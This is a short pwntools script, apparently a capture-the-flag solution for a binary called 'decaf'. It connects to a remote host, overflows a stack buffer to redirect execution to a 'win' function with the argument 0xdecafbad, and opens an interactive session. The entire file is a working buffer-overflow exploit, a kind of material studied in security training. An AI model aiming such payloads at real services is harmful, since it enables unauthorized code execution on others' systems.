from pwn import *

# Connect to the remote server
ps = remote("207.154.239.148", 1339)

# Load the ELF binary
elf = ELF("./decaf")

# Craft the payload
payload = b'Z' * 36
payload += p32(elf.sym.win)
payload += b'Z' * 4
payload += p32(0xdecafbad)

# Send the payload
ps.recv()
ps.sendline(payload)

# Interact with the process
ps.interactive()
